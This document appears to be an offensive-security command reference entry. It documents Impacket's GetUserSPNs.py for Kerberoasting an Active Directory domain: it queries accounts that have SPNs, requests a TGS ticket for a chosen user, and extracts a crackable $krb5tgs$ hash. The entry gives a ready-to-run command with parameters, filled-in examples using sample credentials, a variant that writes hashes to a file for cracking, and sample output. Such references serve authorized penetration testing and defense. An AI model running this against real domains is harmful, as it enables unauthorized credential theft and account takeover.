---
id: 60be6f37-a881-46c8-a040-54b68d209734
name: getuserSPNs-py-query-domain-for-spns-and-retrieve-users-ntlmv2-hash
type: command
executor: bash
data: >-
  GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
  -request-user $_TARGET_USER
output: >-
  root@kali:~# GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5
  -request -request-user steve

  Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth
  Corporation


  ServicePrincipalName  Name   MemberOf  PasswordLastSet            
  LastLogon                   Delegation 

  --------------------  -----  --------  -------------------------- 
  --------------------------  ----------

  nonexistent/bank      steve            2020-06-25 16:29:29.612157  2020-06-25
  16:30:37.127975             




  $krb5tgs$23$*steve$BANK.LOCAL$nonexistent/bank*$9621969cc33159dec22e839a2cf74367$
created_at: '2020-06-25T20:16:48.076670+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - impacket
  - credential-access
verified: true
validated: true
---

# getuserSPNs-py-query-domain-for-spns-and-retrieve-users-ntlmv2-hash

## Command

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request -request-user $_TARGET_USER
```

## Description

This command uses Impacket's GetUserSPNs.py script to query an Active Directory domain for users with SPNs and request Kerberos TGS tickets specifically for a target user, extracting the NTLMv2 hash for offline cracking. It authenticates with provided domain credentials and targets a specific user via the -request-user flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '$_DOMAIN/$_USERNAME:$_PASSWORD' | Domain credentials in format domain/user:pass (e.g., 'bank.local/bob:secretpass') | Yes |
| -dc-ip $_DOMAIN_IP | IP address of the Domain Controller | Yes |
| -request | Requests TGS tickets for SPNs found | Yes |
| -request-user $_TARGET_USER | Specifies the exact user to request ticket for (e.g., 'steve') | Yes |

## Examples

### Basic Usage

```bash
GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5 -request -request-user steve
```

### Advanced Usage

Request and output to file for cracking:

```bash
GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5 -request -request-user steve -outputfile hashes.txt
```

## Expected Output

The command lists the SPN and user details, followed by the crackable $krb5tgs$ hash. Example:

```
root@kali:~# GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5 -request -request-user steve
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  --------  --------------------------  --------------------------  ----------
nonexistent/bank      steve            2020-06-25 16:29:29.612157  2020-06-25 16:30:37.127975             

$krb5tgs$23$*steve$BANK.LOCAL$nonexistent/bank*$9621969cc33159dec22e839a2cf74367$
```

## Related

- [[procedures/Add-SPN-to-Domain-User-and-Kerberoast-for-NTLMv2-Hash]]
- [[tools/Impacket]]
